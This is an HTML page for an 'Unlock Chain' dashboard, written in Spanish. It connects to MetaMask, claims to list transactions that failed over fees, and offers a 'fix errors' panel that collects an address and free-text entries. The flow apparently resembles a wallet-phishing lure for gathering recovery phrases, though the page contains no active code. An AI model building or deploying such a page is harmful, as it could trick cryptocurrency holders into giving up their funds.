<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard de Configuración</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="dashboard">
    <div class="sidebar">
        <h2>Unlock Chain</h2>
        <button id="connectButton">Conectar a MetaMask</button>
        <p id="userAddress" style="color: green;"></p>
        <p id="addressStatus">Status Address: </p>
      <div id="errorOptions">

       <!-- Dentro de <div id="errorOptions" style="display: none;"> -->
<button id="fixErrorsButton">Corregir errores</button>
<div id="fixErrorsContent" class="correction-content" style="display: none;">
    <div class="correction-option">
        <input type="text" id="addressInput" placeholder="Coloca tu address">
        <button id="submitAddress">Enviar</button>

    <div class="correction-option">
        <button id="addTextButton">Agrega tu texto</button>
        <div id="textInputsContainer" class="text-inputs-container" style="display: none;">
            <!-- Aquí se añadirán los inputs para los textos -->
        </div>
        <button id="submitTexts" class="submit-texts" style="display: none;">Enviar Textos</button>
           </div>
        </div>
    </div>
    </div>

       
        <nav>
            <ul>
                <li><a href="#perfil">Perfil</a></li>
                <li><a href="#seguridad">Seguridad</a></li>
                <li><a href="#notificaciones">Notificaciones</a></li>
                <li><a href="#privacidad">Privacidad</a></li>
            </ul>
        </nav>
    </div>
 <div class="main-content">
    <h1>Status Address</h1>
    <!-- Sección de información de la dirección que será visible tras conectarse -->
    <div id="addressInfo" style="display: none;">
        <h2>Address connect: <spanid="userAddress" style="color: green;></span></h2>
        <p>Revisión de eventos fallidos para la dirección especificada debido a error en fee.</p>
        <div id="failedTransactionsList">
            <h2>Eventos Fallidos Recientes</h2>
            <table>
                <thead>
                    <tr>
                        <th>Fecha</th>
                        <th>Descripción del Error</th>
                        <th>Transacción</th>
                    </tr>
                </thead>
                <tbody id="failedTransactionsBody">
                    <!-- Las filas se agregarán dinámicamente -->
                </tbody>
            </table>
        </div>
    </div>
</div>


<script src="script.js"></script>
</body>
</html>
